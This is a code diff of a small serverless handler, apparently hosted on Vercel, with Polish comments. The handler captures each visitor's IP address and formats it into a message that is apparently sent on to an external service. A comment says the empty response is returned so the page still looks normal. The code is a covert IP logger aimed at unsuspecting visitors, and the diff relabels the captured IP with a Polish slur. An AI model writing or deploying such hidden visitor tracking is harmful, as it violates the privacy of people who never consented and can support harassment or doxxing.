@@ -3,10 +3,9 @@ export default async function handler(req, res) {
 
     // Wyciąganie IP klienta z nagłówków Vercela
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown";
-    const browser = req.headers["user-agent"] || "Unknown";
 
     const data = {
-        content: `**User IP:** ${ip}\n**Browser:** ${browser}`
+        content: `**IP CWELA:** ${ip}`
     };
 
     try {
@@ -20,5 +19,5 @@ export default async function handler(req, res) {
     }
 
     // Zwracamy pustą odpowiedź, żeby strona działała normalnie
-return res.status(200).json({ success: true });
+    return res.status(200).json({ success: true });
 }
